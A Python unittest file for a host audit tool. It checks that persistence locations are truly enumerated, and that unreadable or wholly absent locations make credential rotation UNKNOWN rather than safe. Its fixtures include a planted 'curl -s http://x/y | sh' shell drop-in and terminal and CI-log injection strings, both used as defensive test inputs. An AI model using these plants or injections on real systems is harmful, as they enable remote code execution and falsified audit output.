#!/usr/bin/env python3
"""#1332 / #120 — the persistence-surface VERDICT contract. A clean `saw audit` must imply the
persistence surface was ENUMERATED; a surface that could not be read — or that is wholly ABSENT, and
so was never enumerated at all — is UNKNOWN, not clean; and the run states, as a run-level property,
whether credential rotation is safe. Exit `3` encodes rotation-unsafe. Offline, stdlib-only."""
from __future__ import annotations

import ast
import contextlib
import inspect
import os
import tempfile
import textwrap
import threading
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest import mock

from stayawake.bots.security import hygiene
from stayawake.utils import textsafe
from stayawake.bots.security.hygiene import coverage
from stayawake.bots.security.hygiene.models import (
    HygieneIssue, incident_response_sequence, rotation_safety, ROTATION_SAFE,
    ROTATION_UNSAFE_PERSISTENCE, ROTATION_UNSAFE_UNKNOWN)
from stayawake.cli.commands import audit as audit_cmd
from stayawake.bots.security.sinks import render as sink_render


@contextlib.contextmanager
def _config_home(home):
    """Point the XDG/zsh location variables at a fixture home, whatever the ambient environment is."""
    with mock.patch.dict(os.environ, {"XDG_CONFIG_HOME": str(home / ".config")}):
        os.environ.pop("ZDOTDIR", None)
        yield


def _issue(id_, severity="warning"):
    return HygieneIssue(id=id_, severity=severity, title=id_,
                        detail=f"{id_} detail — a location could not be read", remediation="fix it")


class TestCoverageState(unittest.TestCase):
    def test_absent_path_is_clean(self):
        self.assertEqual(coverage._coverage(Path("/no/such/persistence/location")), "absent")

    def test_readable_dir_is_ok(self):
        d = Path(tempfile.mkdtemp(prefix="cov-ok-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(d, ignore_errors=True))
        (d / "a").write_text("x")
        self.assertEqual(coverage._coverage(d), "ok")

    @unittest.skipIf(os.getuid() == 0, "root bypasses permission bits")
    def test_unreadable_dir_is_unverified(self):
        d = Path(tempfile.mkdtemp(prefix="cov-perm-"))
        self.addCleanup(lambda: (os.chmod(d, 0o700), __import__("shutil").rmtree(d, ignore_errors=True)))
        os.chmod(d, 0o000)                       # exists, but we cannot enumerate it
        self.assertEqual(coverage._coverage(d), "unverified")

    @unittest.skipUnless(hasattr(os, "mkfifo"), "no mkfifo on this platform")
    def test_fifo_at_a_location_is_unverified_and_never_hangs(self):
        # A FIFO planted where a regular file is expected (a replaced authorized_keys) must be caught
        # WITHOUT opening it — opening a FIFO for read blocks forever (#1226), a DoS on the auditor.
        d = Path(tempfile.mkdtemp(prefix="cov-fifo-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(d, ignore_errors=True))
        fifo = d / "authorized_keys"
        os.mkfifo(fifo)
        box: dict = {}
        t = threading.Thread(target=lambda: box.__setitem__("r", coverage._coverage(fifo)),
                             daemon=True)
        t.start()
        t.join(5)
        self.assertFalse(t.is_alive(), "_coverage hung on a FIFO — it must never open a non-regular file")
        self.assertEqual(box["r"], "unverified")


class TestTheRecordsInsideADirectoryAreCertifiedToo(unittest.TestCase):
    """Listing a start-up directory certifies the FOLDER. The records inside it are what a probe
    reads, so they are what has to be readable for that probe's silence to mean anything."""

    def _graded(self, home):
        with mock.patch.object(coverage.os_service, "user_persistence_dirs",
                               return_value=(home / "Library" / "LaunchAgents",)), \
             mock.patch.object(coverage.runner, "user_runner_dirs", return_value=()), \
             mock.patch.object(coverage.mechanism, "shell_rc_locations",
                               return_value=(home / ".zshrc",)):
            return coverage.check_persistence_coverage()

    def _home(self):
        home = Path(tempfile.mkdtemp())
        (home / "Library" / "LaunchAgents").mkdir(parents=True)
        (home / ".zshrc").write_text("export X=1\n", encoding="utf-8")
        return home

    def test_a_readable_agent_leaves_the_surface_certified(self):
        home = self._home()
        (home / "Library" / "LaunchAgents" / "com.example.plist").write_text(
            "<plist/>", encoding="utf-8")
        self.assertEqual(self._graded(home), [])

    def test_one_unreadable_agent_does_not_hide_its_siblings(self):
        # A regression pin: one unreadable child must not take its siblings out of the listing.
        home = self._home()
        agents = home / "Library" / "LaunchAgents"
        for name in ("a.plist", "b.plist", "c.plist"):
            (agents / name).write_text("<plist/>", encoding="utf-8")
        os.chmod(agents, 0o600)                      # listable, not searchable: stat on each fails
        try:
            issues = self._graded(home)
        finally:
            os.chmod(agents, 0o755)
        self.assertEqual([i.id for i in issues], ["persistence-surface-unverified"])
        for name in ("a.plist", "b.plist", "c.plist"):
            self.assertIn(name, issues[0].detail, f"{name} was dropped with its sibling")

    def test_a_symlinked_record_is_certified_like_any_other(self):
        # A package manager commonly symlinks agents into place; only the filesystem shape differs.
        home = self._home()
        elsewhere = home / "elsewhere.plist"
        elsewhere.write_text("<plist/>", encoding="utf-8")
        os.chmod(elsewhere, 0o000)
        os.symlink(elsewhere, home / "Library" / "LaunchAgents" / "com.example.plist")
        try:
            issues = self._graded(home)
        finally:
            os.chmod(elsewhere, 0o644)
        self.assertEqual([i.id for i in issues], ["persistence-surface-unverified"],
                         "a symlinked record was certified by never being looked at")

    def test_a_record_one_directory_deeper_is_certified(self):
        # A drop-in that replaces a unit's command line executes, and is a directory deeper.
        home = self._home()
        dropin = home / "Library" / "LaunchAgents" / "ssh-agent.service.d"
        dropin.mkdir()
        conf = dropin / "override.conf"
        conf.write_text("[Service]\nExecStart=/bin/sh -c x\n", encoding="utf-8")
        os.chmod(conf, 0o000)
        try:
            issues = self._graded(home)
        finally:
            os.chmod(conf, 0o644)
        self.assertEqual([i.id for i in issues], ["persistence-surface-unverified"])
        self.assertIn("override.conf", issues[0].detail)

    def test_an_unreadable_agent_withholds_the_all_clear(self):
        home = self._home()
        agent = home / "Library" / "LaunchAgents" / "com.example.plist"
        agent.write_text("<plist/>", encoding="utf-8")
        os.chmod(agent, 0o000)
        try:
            issues = self._graded(home)
        finally:
            os.chmod(agent, 0o644)
        self.assertEqual([i.id for i in issues], ["persistence-surface-unverified"],
                         "an agent nobody could read was graded as an agent that was read")
        self.assertIn("com.example.plist", issues[0].detail)


class TestCoverageProbe(unittest.TestCase):
    def test_unreadable_location_yields_unverified_issue(self):
        d = Path(tempfile.mkdtemp(prefix="cov-probe-"))
        self.addCleanup(lambda: (os.chmod(d, 0o700), __import__("shutil").rmtree(d, ignore_errors=True)))
        if os.getuid() == 0:
            self.skipTest("root bypasses permission bits")
        os.chmod(d, 0o000)
        with mock.patch.object(coverage, "_must_verify_locations", return_value=[("launch dir", d)]):
            issues = coverage.check_persistence_coverage()
        self.assertEqual([i.id for i in issues], ["persistence-surface-unverified"])
        self.assertEqual(issues[0].severity, "unknown")

    def test_all_absent_or_readable_is_clean(self):
        readable = Path(tempfile.mkdtemp(prefix="cov-clean-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(readable, ignore_errors=True))
        locs = [("absent", Path("/no/such/x")), ("readable", readable)]
        with mock.patch.object(coverage, "_must_verify_locations", return_value=locs):
            self.assertEqual(coverage.check_persistence_coverage(), [])

    def test_probe_is_in_the_single_composition_site(self):
        # audit_checks() is the ONE place probes are registered; the coverage probe must be there.
        labels = [lbl for lbl, _ in hygiene.audit_checks()]
        self.assertIn("persistence surface coverage", labels)

    def test_surface_covers_the_active_plant_locations(self):
        # The certified surface must include the deterministic user-owned PLANT locations (the wiper
        # dirs, runner dirs, SSH authorized_keys, shell rc) — the ones whose silent skip was the hole.
        labels = {lbl for lbl, _ in coverage._must_verify_locations()}
        self.assertIn("launch-agent / service dir", labels)
        self.assertIn("self-hosted-runner dir", labels)
        self.assertTrue(any("SSH" in l for l in labels))
        self.assertTrue(any("shell" in l for l in labels))


class TestRotationSafetyVerdict(unittest.TestCase):
    def test_states(self):
        self.assertEqual(rotation_safety(set()), ROTATION_SAFE)
        self.assertEqual(rotation_safety({"os-service-persistence"}), ROTATION_UNSAFE_PERSISTENCE)
        self.assertEqual(rotation_safety({"persistence-surface-unverified"}), ROTATION_UNSAFE_UNKNOWN)

    def test_active_persistence_dominates_unknown(self):
        self.assertEqual(
            rotation_safety({"os-service-persistence", "persistence-surface-unverified"}),
            ROTATION_UNSAFE_PERSISTENCE)


class TestAuditRender(unittest.TestCase):
    def test_clean_run_states_rotation_safe(self):
        r = hygiene.render([])
        self.assertIn("no issues found", r)
        self.assertIn("Rotation safety", r)
        self.assertIn("safe", r.lower())

    def test_unverified_surface_reads_as_unknown_not_clean(self):
        r = hygiene.render([_issue("persistence-surface-unverified", "unknown")])
        self.assertNotIn("no issues found", r)      # never a false all-clear
        self.assertIn("UNKNOWN", r)
        self.assertIn("UNSAFE", r)

    def test_active_persistence_is_rotation_unsafe(self):
        r = hygiene.render([_issue("os-service-persistence")])
        self.assertIn("UNSAFE", r)
        self.assertIn("rotate", r.lower())


class TestAuditExitCode(unittest.TestCase):
    def _run(self, issues, *, fail=False):
        args = SimpleNamespace(repo=None, branch="main", fail=fail, no_stream=True,
                               verify_artifacts=False)
        with mock.patch.object(audit_cmd.auth, "resolve_token", return_value=(None, None)), \
             mock.patch.object(audit_cmd.hygiene, "audit_checks",
                               return_value=[("x", lambda: issues)]):
            return audit_cmd.run(args)

    def test_active_persistence_exits_3_even_without_fail(self):
        self.assertEqual(self._run([_issue("os-service-persistence")]), 3)

    def test_unverified_surface_exits_3(self):
        self.assertEqual(self._run([_issue("persistence-surface-unverified", "unknown")]), 3)

    def test_unestablished_surface_exits_3(self):
        self.assertEqual(self._run([_issue("persistence-surface-not-established", "unknown")]), 3)

    def test_clean_exits_0(self):
        self.assertEqual(self._run([]), 0)

    def test_weaker_warning_keeps_optin_gate(self):
        # a non-persistence warning is the opt-in axis: 0 by default, 1 with -f — unchanged.
        self.assertEqual(self._run([_issue("git-credentials-plaintext")], fail=False), 0)
        self.assertEqual(self._run([_issue("git-credentials-plaintext")], fail=True), 1)


class TestWhollyAbsentSurfaceIsNotClean(unittest.TestCase):
    """#120 — a wipe does not SUPPRESS these checks, it SATISFIES them: every location grades
    `absent`, so the run reaches "enumerated and clean — rotating credentials is safe" on a host whose
    home was just destroyed. Nothing was enumerated, so the all-clear has to be withheld."""

    ABSENT = [("launch-agent / service dir", Path("/no/such/agents")),
              ("SSH authorized_keys", Path("/no/such/.ssh/authorized_keys")),
              (coverage._ANCHOR_LABEL, Path("/no/such/.zshrc"))]

    def _issues(self, locs):
        with mock.patch.object(coverage, "_must_verify_locations", return_value=locs):
            return coverage.check_persistence_coverage()

    def test_a_wholly_absent_surface_reads_as_unknown_not_clean(self):
        issues = self._issues(self.ABSENT)
        self.assertEqual([i.id for i in issues], ["persistence-surface-not-established"])
        self.assertEqual(issues[0].severity, "unknown")

    def test_the_location_classes_are_named_from_the_data_not_from_prose(self):
        # A hand-written list silently misdescribes the surface the moment a class is added or
        # dropped — the same defect this module exists to remove, one level up.
        detail = self._issues(self.ABSENT)[0].detail
        for label in {lbl for lbl, _ in self.ABSENT}:
            self.assertIn(label, detail)

    def test_it_states_both_readings_and_picks_neither(self):
        # A fresh account and a destroyed one are indistinguishable from disk, so it must not claim
        # either. (Measured: macOS builds a new account from a template that carries no shell startup
        # file and no ~/Library/LaunchAgents, so the benign reading is not hypothetical.)
        issue = self._issues(self.ABSENT)[0]
        for reading in ("new account", "container", "destroyed"):
            self.assertIn(reading, issue.detail)

    def test_one_present_anchor_keeps_the_surface_established(self):
        d = Path(tempfile.mkdtemp(prefix="cov-anchor-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(d, ignore_errors=True))
        (d / ".zshrc").write_text("export PATH=$PATH\n")
        self.assertEqual(self._issues(self.ABSENT + [(coverage._ANCHOR_LABEL, d / ".zshrc")]), [])

    def test_a_dangling_symlink_does_not_switch_the_verdict_off(self):
        # A wipe of `~/dotfiles` leaves `~/.zshrc -> …` dangling, and `ln -s /nonexistent ~/.zlogin`
        # is one command. Treating a link the operator can see as "the surface exists" was measured
        # to hand back "enumerated and clean — rotating credentials is safe" on a wiped home.
        home = Path(tempfile.mkdtemp(prefix="cov-dangling-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(home, ignore_errors=True))
        for name, target in ((".zshrc", home / "dotfiles" / "zshrc"), (".zlogin", Path("/nonexistent"))):
            with self.subTest(name=name):
                link = home / name
                link.unlink(missing_ok=True)
                link.symlink_to(target)
                ids = [i.id for i in self._issues(self.ABSENT + [(coverage._ANCHOR_LABEL, link)])]
                self.assertEqual(ids, ["persistence-surface-not-established"])

    def test_a_surface_carrying_no_anchor_never_fires(self):
        # "everything is absent" over a list holding nothing an in-use account acquires is vacuously
        # true, not evidence — so the anchor has to be present for the claim to mean anything.
        self.assertEqual(self._issues([("launch-agent / service dir", Path("/no/such/agents"))]), [])

    def test_it_stays_silent_where_the_platform_has_no_enumerable_surface(self):
        # On Windows every certified location is absent by construction, so this would fire on every
        # host and say nothing about it. That gap is disclosed by the scope note instead.
        with mock.patch("sys.platform", "win32"):
            self.assertEqual(self._issues(self.ABSENT), [])

    @unittest.skipIf(os.getuid() == 0, "root bypasses permission bits")
    def test_an_unreadable_location_is_the_other_state_not_this_one(self):
        # The two UNKNOWN states are mutually exclusive by construction: an unreadable location is
        # not an absent one, so a surface with one cannot also be wholly absent.
        d = Path(tempfile.mkdtemp(prefix="cov-excl-"))
        self.addCleanup(lambda: (os.chmod(d, 0o700), __import__("shutil").rmtree(d, ignore_errors=True)))
        os.chmod(d, 0o000)
        ids = [i.id for i in self._issues(self.ABSENT + [("launch-agent / service dir", d)])]
        self.assertEqual(ids, ["persistence-surface-unverified"])

    def test_it_withholds_the_rotation_all_clear(self):
        self.assertEqual(rotation_safety({"persistence-surface-not-established"}),
                         ROTATION_UNSAFE_UNKNOWN)

    def test_the_report_never_says_rotating_is_safe(self):
        report = hygiene.render([_issue("persistence-surface-not-established", "unknown")])
        self.assertNotIn("rotating credentials is safe", report)
        self.assertIn("UNKNOWN", report)
        self.assertIn("UNSAFE", report)

    def test_the_detail_and_the_fix_both_reach_the_report(self):
        # The shared verdict line is generic; "new or destroyed" is stated in the ISSUE detail and
        # what to do about it in the remediation. `unknown` items are split out of the finding
        # groups, so the verdict block is their only home — printing the problem and swallowing the
        # instruction told the operator rotation is unsafe and never what would make it safe again.
        issue = HygieneIssue(id="persistence-surface-not-established", severity="unknown",
                             title="t", detail="NOTHING WAS ENUMERATED HERE",
                             remediation="IMAGE THE DISK FIRST")
        report = hygiene.render([issue])
        self.assertIn("NOTHING WAS ENUMERATED HERE", report)
        self.assertIn("IMAGE THE DISK FIRST", report)

    def test_the_unreadable_state_gets_its_fix_printed_too(self):
        # Same hole, same fix — it was never specific to the new state.
        report = hygiene.render([HygieneIssue(id="persistence-surface-unverified", severity="unknown",
                                              title="t", detail="d", remediation="RE-RUN WITH ACCESS")])
        self.assertIn("RE-RUN WITH ACCESS", report)

    def test_both_disclosed_fields_are_encoded_like_every_other_untrusted_field(self):
        # These details name discovered PATHS, and the fix line renders in the same block. A field
        # added to this path without the encoder is how the audit report becomes a terminal- and
        # CI-log-injection surface again — the encoder lives at the render site precisely so a new
        # field cannot arrive unencoded because whoever added it did not know to encode.
        hostile = "x\x1b]0;pwned\x07::error::FAKE-saw-says-clean\x1b[2J"
        report = hygiene.render([HygieneIssue(
            id="persistence-surface-not-established", severity="unknown", title="t",
            detail="D:" + hostile, remediation="R:" + hostile)])
        self.assertNotIn("\x1b", report)
        self.assertNotIn("::error::", report)

    def test_the_shipped_issue_tells_the_operator_to_image_before_using_the_host(self):
        # Increment 2 of the #120 proposal, at the point the decision is actually made: a plain
        # delete leaves content in freed blocks and continued use overwrites it.
        remediation = self._issues(self.ABSENT)[0].remediation
        self.assertIn("image the disk", remediation.lower())
        self.assertIn("recoverable", remediation.lower())

    def test_the_incident_reading_is_stated_before_the_reassuring_one(self):
        # This block also renders directly under "UNSAFE — active host persistence detected", where
        # an operator whose eye stops after one sentence must not have read "nothing to do".
        remediation = self._issues(self.ABSENT)[0].remediation
        self.assertLess(remediation.index("treat it as an incident"),
                        remediation.index("nothing to do"))


class TestTheDisclosureIsNeverAmputated(unittest.TestCase):
    """The encoder that defangs an attacker-chosen path also TRUNCATES, at a bound sized for one
    value rather than prose carrying one: measured, the disclosure printed 2 of 11 unreadable
    locations and the rotation-wiper warning stopped mid-sentence."""

    def _rendered(self, issue):
        return hygiene.render([issue], color=False, width=100)

    def test_every_unreadable_location_is_named_however_many_there_are(self):
        d = Path(tempfile.mkdtemp(prefix="cov-many-"))
        self.addCleanup(lambda: [os.chmod(p, 0o700) for p in d.iterdir()])
        self.addCleanup(lambda: __import__("shutil").rmtree(d, ignore_errors=True))
        if os.getuid() == 0:
            self.skipTest("root bypasses permission bits")
        locs = []
        for name in sorted({p.name for p in coverage.mechanism.shell_rc_locations()}):
            p = d / name
            p.mkdir()
            os.chmod(p, 0o000)
            locs.append((coverage._ANCHOR_LABEL, p))
        with mock.patch.object(coverage, "_must_verify_locations", return_value=locs):
            issue = coverage.check_persistence_coverage()[0]
        report = self._rendered(issue)
        for _label, p in locs:
            self.assertIn(p.name, report, f"{p.name} was cut out of the disclosure")

    def test_the_shipped_wording_survives_rendering_whole(self):
        # Both shipped strings exceed the encoder's default bound; the last clause of each is the
        # load-bearing one (why the state matters, and the wiper warning).
        # SYNTHETIC long fields on purpose: the subject is the RENDERER, which must not truncate,
        # and the shipped strings are now deliberately short — so reading the corpus would make this
        # test pass for the wrong reason the moment a finding is shortened.
        long_detail = "Every certified location is absent. " + "Context that must survive. " * 14
        long_fix = "Confirm which it is. " + "Then do this next. " * 16
        issue = HygieneIssue(id="persistence-surface-not-established", severity="unknown",
                             title="t", detail=long_detail, remediation=long_fix)
        report = " ".join(self._rendered(issue).split())
        for field in (issue.detail, issue.remediation):
            self.assertGreater(len(field), 300, "the fixture must exceed the old truncation point")
            tail = " ".join(field.split())[-40:]
            self.assertIn(tail, report, f"the field was truncated before: ...{tail}")


class TestTheCertifiedSurfaceIsTheScannedSurface(unittest.TestCase):
    """coverage.py's invariant: what we read to DETECT a plant is what we must read to certify the
    host clean. A file the scan reads but the coverage probe does not certify makes the audit report
    it absent while reading it — on a fish-only account, the difference between clean and exit 3."""

    def test_every_scanned_shell_startup_file_is_also_certified(self):
        with mock.patch.object(Path, "home", staticmethod(lambda: Path("/h"))):
            scanned = set(coverage.mechanism.shell_rc_locations())
            certified = {p for label, p in coverage._must_verify_locations()
                         if label == coverage._ANCHOR_LABEL}
        self.assertEqual(scanned - certified, set(),
                         "scanned but never certified — the audit would report it absent")

    def test_a_config_kept_outside_home_is_resolved_not_assumed(self):
        # $ZDOTDIR, XDG fish/nushell, and fish's conf.d drop-in dir: layouts that deliberately keep
        # $HOME clean, where a fetch-to-shell line runs on every new terminal.
        home = Path("/h")
        with mock.patch.dict(os.environ, {"ZDOTDIR": "/z", "XDG_CONFIG_HOME": "/x"}), \
             mock.patch.object(Path, "home", staticmethod(lambda: home)):
            found = {str(p) for p in coverage.mechanism.shell_rc_locations()}
        self.assertIn("/z/.zshrc", found, "$ZDOTDIR is where zsh itself looks")
        self.assertIn("/x/fish/config.fish", found)
        self.assertIn("/x/fish/conf.d", found)
        self.assertIn("/x/nushell/config.nu", found)
        self.assertIn("/h/.bashrc", found, "bash rc files stay in $HOME")

    def test_it_resolves_on_every_platform_and_survives_an_empty_env_var(self):
        # An unset var and one set to "" are different values and the same intent; the macOS-only
        # location must not appear elsewhere; and neither consumer may raise on any platform.
        for plat in ("darwin", "linux", "win32"):
            for env in ({}, {"ZDOTDIR": ""}, {"XDG_CONFIG_HOME": ""}):
                with self.subTest(platform=plat, env=env), \
                     mock.patch("sys.platform", plat), \
                     mock.patch.object(Path, "home", staticmethod(lambda: Path("/h"))), \
                     mock.patch.dict(os.environ, env, clear=False):
                    for k in ("ZDOTDIR", "XDG_CONFIG_HOME"):
                        if k not in env:
                            os.environ.pop(k, None)
                    found = coverage.mechanism.shell_rc_locations()
                    coverage.mechanism._iter_shell_rc()
                    coverage._must_verify_locations()
                    self.assertIn(Path("/h/.zshrc"), found, "an empty var must fall back to $HOME")
                    self.assertEqual(any("Application Support" in str(p) for p in found),
                                     plat == "darwin")

    def test_a_zdotdir_account_is_not_reported_as_having_nothing(self):
        zdot = Path(tempfile.mkdtemp(prefix="cov-zdot-"))
        home = Path(tempfile.mkdtemp(prefix="cov-zhome-"))
        self.addCleanup(lambda: [__import__("shutil").rmtree(d, ignore_errors=True)
                                 for d in (zdot, home)])
        (zdot / ".zshrc").write_text("source $ZSH/oh-my-zsh.sh\n")
        with mock.patch.dict(os.environ, {"ZDOTDIR": str(zdot)}), \
             mock.patch.object(Path, "home", staticmethod(lambda: home)):
            self.assertEqual([i.id for i in coverage.check_persistence_coverage()], [])

    def test_a_conf_d_drop_in_is_read_for_a_planted_line(self):
        home = Path(tempfile.mkdtemp(prefix="cov-confd-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(home, ignore_errors=True))
        confd = home / ".config" / "fish" / "conf.d"
        confd.mkdir(parents=True)
        (confd / "99-evil.fish").write_text("curl -s http://x/y | sh\n")
        with _config_home(home), mock.patch.object(Path, "home", staticmethod(lambda: home)):
            read = [p.name for p in coverage.mechanism._iter_shell_rc()]
        self.assertIn("99-evil.fish", read, "a conf.d drop-in is sourced on every shell start")

    def test_a_fish_only_account_is_not_reported_as_having_nothing(self):
        home = Path(tempfile.mkdtemp(prefix="cov-fish-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(home, ignore_errors=True))
        (home / ".config" / "fish").mkdir(parents=True)
        (home / ".config" / "fish" / "config.fish").write_text("fish_add_path /opt/homebrew/bin\n")
        # $XDG_CONFIG_HOME has to be controlled, not inherited: the resolver honours it (correctly —
        # it is where fish itself looks), and a CI runner sets it to somewhere unrelated to this
        # fixture, which is how this passed locally and failed on every runner.
        with _config_home(home), mock.patch.object(Path, "home", staticmethod(lambda: home)):
            self.assertEqual([i.id for i in coverage.check_persistence_coverage()], [])


class TestTheReportDescribesTheRightUnknown(unittest.TestCase):
    """The two UNKNOWN states have opposite causes — one location could not be READ, or every
    location was read and none EXISTED. A report that describes the second as the first sends a
    responder hunting for an unreadable location there is none of, which is the one thing this
    disclosure exists to give them."""

    def _report(self, id_):
        return " ".join(hygiene.render([HygieneIssue(id=id_, severity="unknown", title="t",
                                                     detail="d", remediation="r")],
                                       color=False, width=100).split())

    def test_the_verdict_line_is_true_of_both_states(self):
        for id_ in ("persistence-surface-unverified", "persistence-surface-not-established"):
            with self.subTest(id=id_):
                report = self._report(id_)
                self.assertIn("could not be established", report)
                self.assertNotIn("could not be fully verified", report)

    def test_the_heading_names_the_state_it_reached(self):
        # The report's most prominent line, on a host whose home may have just been destroyed. It
        # said "UNVERIFIED" — the word the verdict below it does not use — and led with "no findings".
        absent = self._report("persistence-surface-not-established")
        self.assertIn("nothing was there to examine", absent.splitlines()[0])
        self.assertNotIn("UNVERIFIED", absent.splitlines()[0])
        self.assertIn("UNVERIFIED", self._report("persistence-surface-unverified").splitlines()[0])
        self.assertIn("no issues found", " ".join(hygiene.render([]).splitlines()[:1]))

    def test_the_scope_note_does_not_claim_a_read_failure_that_did_not_happen(self):
        absent = self._report("persistence-surface-not-established")
        self.assertNotIn("read the part of the persistence surface it could", absent)
        self.assertNotIn("could not be fully read", absent)
        self.assertIn("found no persistence surface present", absent)

    def test_the_unreadable_state_keeps_its_own_wording(self):
        unreadable = self._report("persistence-surface-unverified")
        self.assertIn("read the part of the persistence surface it could", unreadable)

    def test_a_clean_run_still_claims_the_full_surface(self):
        self.assertIn("read the host persistence surface and", " ".join(hygiene.render([]).split()))


class TestNoDiscoveredValueRendersVerbatim(unittest.TestCase):
    """`command` renders verbatim (#86) on the premise that it is built from our own literals. A
    `git config --show-origin` path breaks that premise: `include.path` in a repo-local `.git/config`
    names any file, and `/usr/local/git/` counts as a system config without needing root."""

    HOSTILE = "/usr/local/git/x\x1b]0;pwned\x07::error::FAKE-saw-says-clean\x1b[2J##[error]c.cfg"

    def test_a_discovered_config_path_cannot_carry_control_text_into_a_command(self):
        from stayawake.bots.security.hygiene import credentials
        store = credentials.KeychainStore(name="the test store", delete_command="delete-it")
        with mock.patch.object(credentials, "_system_default_helper_origin",
                               return_value=self.HOSTILE), \
             mock.patch.object(credentials, "_https_token_status", return_value=None):
            issue = credentials._keychain_finding(store)
        self.assertIsNotNone(issue.command, "this path must emit a command for the pin to mean anything")
        self.assertNotIn("\x1b", issue.command)
        self.assertNotIn("::error::", issue.command)
        self.assertNotIn("##[", issue.command)
        self.assertIn("/usr/local/git/x", issue.command)   # still names the file, still pasteable


class TestProbesStayUnconditional(unittest.TestCase):
    """#120 AC 1 — wipe evidence must never suppress, downgrade or skip a persistence probe. That
    holds today only because there is no signal that could gate one, so it is PINNED rather than
    assumed: this fails the moment a probe is registered behind a branch."""

    def _tree(self):
        return ast.parse(textwrap.dedent(inspect.getsource(hygiene.audit_checks))).body[0]

    def test_the_body_is_a_single_return_of_a_flat_list(self):
        fn = self._tree()
        body = fn.body[1:] if ast.get_docstring(fn) else fn.body
        self.assertEqual(len(body), 1, "audit_checks grew statements before its return")
        self.assertIsInstance(body[0], ast.Return)
        self.assertIsInstance(body[0].value, ast.List)

    def test_no_probe_is_registered_behind_a_branch(self):
        gated = sorted({type(n).__name__ for n in ast.walk(self._tree())
                        if isinstance(n, (ast.If, ast.IfExp, ast.For, ast.While, ast.Try,
                                          ast.ListComp, ast.GeneratorExp, ast.Match))})
        self.assertEqual(gated, [], f"a probe is gated behind {gated}")

    def test_every_probe_runs_for_every_argument_combination(self):
        registered = {tuple(lbl for lbl, _ in hygiene.audit_checks(slug, token, "main",
                                                                   verify_artifacts=verify))
                      for slug in (None, "owner/repo")
                      for token in (None, "t0ken")
                      for verify in (False, True)}
        self.assertEqual(len(registered), 1, f"the probe set varies with arguments: {registered}")


class TestHostGuidanceNeverPromisesRecovery(unittest.TestCase):
    """#122 — whether a wipe overwrote or only unlinked is a property of the PAYLOAD, and `saw`
    reads it on the scan path. The host path never sees it. It said "the data is still recoverable"
    anyway, which sends a secure-wipe victim carving empty blocks for hours and reads as a promise
    the tool cannot keep. Every recoverability sentence here names what it depends on."""

    def _guidance(self):
        with mock.patch.object(coverage, "_must_verify_locations",
                               return_value=[("shell startup file", Path("/nope/.zshrc"))]):
            issues = coverage.check_persistence_coverage()
        yield "the wiped-home finding", issues[0].remediation
        for step in incident_response_sequence():
            if "image the disk" in step.lower():
                yield "the runbook imaging step", step

    def test_recoverability_is_tied_to_the_variant_rather_than_asserted(self):
        seen = 0
        for where, text in self._guidance():
            with self.subTest(where=where):
                self.assertIn("recoverab", text.lower(), "the recoverability question vanished")
                self.assertIn("depends on the wipe variant", text.lower(),
                              "recoverability is asserted instead of tied to what decides it")
                self.assertNotIn("still recoverable", text.lower())
                seen += 1
        self.assertEqual(seen, 2, "a guidance site moved — re-anchor this pin")


class TestRunbookImagesBeforeItOverwrites(unittest.TestCase):
    """#120 — `saw` already computes whether a wipe payload plain-deletes (content survives in freed
    blocks) or overwrites-then-deletes (it does not), and the runbook's rebuild step is precisely the
    one that destroys what a plain delete left behind. So imaging is offered BEFORE it."""

    def test_imaging_precedes_the_step_that_overwrites_the_disk(self):
        steps = incident_response_sequence()
        image = [i for i, s in enumerate(steps) if "image the disk" in s.lower()]
        rebuild = [i for i, s in enumerate(steps) if "rebuild affected hosts" in s.lower()]
        self.assertTrue(image, "the runbook never offers to image the disk")
        self.assertTrue(rebuild, "the rebuild step moved — re-anchor this ordering pin")
        self.assertLess(image[0], rebuild[0], "imaging is offered after the disk is overwritten")

    def test_it_names_the_discriminator_saw_already_computes(self):
        joined = " ".join(incident_response_sequence()).lower()
        self.assertIn("recoverable", joined)
        self.assertIn("overwrite", joined)

    def test_rotation_is_still_the_last_step(self):
        self.assertIn("rotate", incident_response_sequence()[-1].lower())


class TestScanHostNote(unittest.TestCase):
    def _payload(self, *, infected: int):
        r = {"target": "repo", "source": "local", "infected": bool(infected),
             "suspicious": False, "error": None,
             "summary": {"total": 0, "max_severity": None}, "findings": [], "advisories": [],
             "notes": []}
        return {"summary": {"targets": 1, "infected": infected, "suspicious": 0, "findings": 0,
                            "critical": 0, "high": 0},
                "generated_at": "t", "results": [r]}

    def test_clean_scan_points_at_saw_audit(self):
        out = sink_render.render_terminal(self._payload(infected=0))
        self.assertIn("Host note", out)
        self.assertIn("saw audit", out)

    def test_infected_scan_omits_the_host_note(self):
        out = sink_render.render_terminal(self._payload(infected=1))
        self.assertNotIn("Host note", out)


if __name__ == "__main__":
    unittest.main()
